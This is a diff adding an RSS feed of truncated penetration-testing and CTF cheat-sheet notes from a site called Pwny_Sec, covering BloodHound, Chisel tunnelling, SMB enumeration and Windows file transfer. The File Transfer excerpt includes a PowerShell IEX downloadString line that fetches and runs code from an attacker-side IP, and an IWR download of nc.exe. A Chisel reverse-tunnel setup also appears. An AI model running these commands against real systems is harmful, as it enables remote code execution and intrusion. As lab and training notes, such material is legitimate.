@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Windows on Pwny_Sec</title>
+    <link>/windows/</link>
+    <description>Recent content in Windows on Pwny_Sec</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    
+	<atom:link href="/windows/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>BloodHound Neo4j</title>
+      <link>/windows/bloodhound/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows/bloodhound/</guid>
+      <description>TAKE A SNAPSHOT BEFORE ATTEMPTING THIS.
+I would highly recommend installing Neo4j using the repository. Neo4j is a database for bloodhound API. I had a couple of issues installing this. had some issues with multiple versions of Java running. currently, neo4k only runs on Java 8 kali currently comes with 11.x. need to tell java to use the legacy version. Next, need to add the repository to download neo4j.
+##### echo &amp;quot;deb http://httpredir.</description>
+    </item>
+    
+    <item>
+      <title>ChiselTunnel</title>
+      <link>/windows/chisel/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows/chisel/</guid>
+      <description>MY FAVORITE SOCKS PROXY TOOL.
+Chisel SERVER
+./Chisel server -p 8000 -reverse -v -reverse the connection this is important -v verbose -p port  Chisel.exe CLIENT
+c.exe client 10.10.15.254:8000 R:8081:127.0.0.1:8081	 </description>
+    </item>
+    
+    <item>
+      <title>File Transfer</title>
+      <link>/windows/filetransfer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows/filetransfer/</guid>
+      <description>UNDERDEVELOPMENT GONNA GO DO SOME CTF LOL  #####################Window############## Download ​``` # Python http server ​``` listener = python3 -m http.server 9090 listener = python -m SimpleHTTPServer 9090 Invoke = IEX(New-Object Net.WebClient).downloadString(&#39;http://IP_ADDRESS/file-needed&#39;) Invoke-Web-Request = powershell IWR &amp;quot;http://10.10.14.49/nc.exe&amp;quot; -OutFile nc.exe ############################################ Upload using SMB to share files i would like to note that that impacket might hang and since its written in python. ps -ef|grep python. #target machine net use z: \\IP_ADDRESS\share ​``` # kali machine ​``` impacket-smbserver share `pwd` | ` not &#39; #target machine copy file_name z: ###################### note if you have issues try this method ###################################### #target machine net use z: \\IP_ADDRESS\share ​``` # kali machine impacket-smbserver share `pwd` | ` not &#39; #target machine cd z: mkdir tmp cd tmp IEX(New-Object Net.</description>
+    </item>
+    
+    <item>
+      <title>SMB</title>
+      <link>/windows/linux-smb-enum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows/linux-smb-enum/</guid>
+      <description>Mounting smb shares linux
+You may get an error, this means that the supporting programs aren&amp;rsquo;t there.
+sudo apt install cifs-utils -y sudo apt install nfs-common  Error Message
+bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&amp;lt;type&amp;gt; helper program.  Example
+mount -o user=REPLACE &#39;//ip_addr/share&#39; /mnt/share  +++
+SMBCLIENT
+Usage: smbclient service &amp;lt;password&amp;gt; -R, --name-resolve=NAME-RESOLVE-ORDER Use these name resolution services only -M, --message=HOST Send message -I, --ip-address=IP Use this IP to connect to -E, --stderr Write messages to stderr instead of stdout -L, --list=HOST Get a list of shares available on a host -m, --max-protocol=LEVEL Set the max protocol level -T, --tar=&amp;lt;c|x&amp;gt;IXFqgbNan Command line tar -D, --directory=DIR Start from directory -c, --command=STRING Execute semicolon separated commands -b, --send-buffer=BYTES Changes the transmit/send buffer -t, --timeout=SECONDS Changes the per-operation timeout -p, --port=PORT Port to connect to -g, --grepable Produce grepable output -q, --quiet Suppress help message -B, --browse Browse SMB servers using DNS Help options: -?</description>
+    </item>
+    
+    <item>
+      <title>SMB-KALI</title>
+      <link>/windows/smb/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows/smb/</guid>
+      <description>Mounting smb shares linux
+You may get an error, this means that the supporting programs aren&amp;rsquo;t there.
+sudo apt install cifs-utils -y sudo apt install nfs-common  Error Message
+bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&amp;lt;type&amp;gt; helper program.  Example
+mount -o user=REPLACE &#39;//ip_addr/share&#39; /mnt/share  +++
+SMBCLIENT
+Usage: smbclient service &amp;lt;password&amp;gt; -R, --name-resolve=NAME-RESOLVE-ORDER Use these name resolution services only -M, --message=HOST Send message -I, --ip-address=IP Use this IP to connect to -E, --stderr Write messages to stderr instead of stdout -L, --list=HOST Get a list of shares available on a host -m, --max-protocol=LEVEL Set the max protocol level -T, --tar=&amp;lt;c|x&amp;gt;IXFqgbNan Command line tar -D, --directory=DIR Start from directory -c, --command=STRING Execute semicolon separated commands -b, --send-buffer=BYTES Changes the transmit/send buffer -t, --timeout=SECONDS Changes the per-operation timeout -p, --port=PORT Port to connect to -g, --grepable Produce grepable output -q, --quiet Suppress help message -B, --browse Browse SMB servers using DNS Help options: -?</description>
+    </item>
+    
+    <item>
+      <title>Windows</title>
+      <link>/windows/windows_enum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows/windows_enum/</guid>
+      <description>Commands
+Finding things in windows.
+find /I &amp;quot;thing&amp;quot; secrets.txt findstr &amp;quot;thing&amp;quot;  Shell preferences nishang &amp;lt; nc &amp;lt; winrm / meterpreter
+whoami /all /priv systeminfo findstr	= grep  $ExecutionContext.SessionState.LanguageMode  change password inside powershell.
+$password = read-host &amp;quot;Su-ErD;perPa$sw0rd&amp;quot; -assecurestring $useraccount = get-localuser -name &amp;quot;pinkiepie&amp;quot; $useraccount | set-localuser -password $password  os
+https://developer.microsoft.com/en-us/windows/downloads/virtual-machines
+Windows File Type for running commands scripts executables. I found this list looking up applocker policies.
+AppLocker ApplockerFileExtentions</description>
+    </item>
+    
+  </channel>
+</rss>
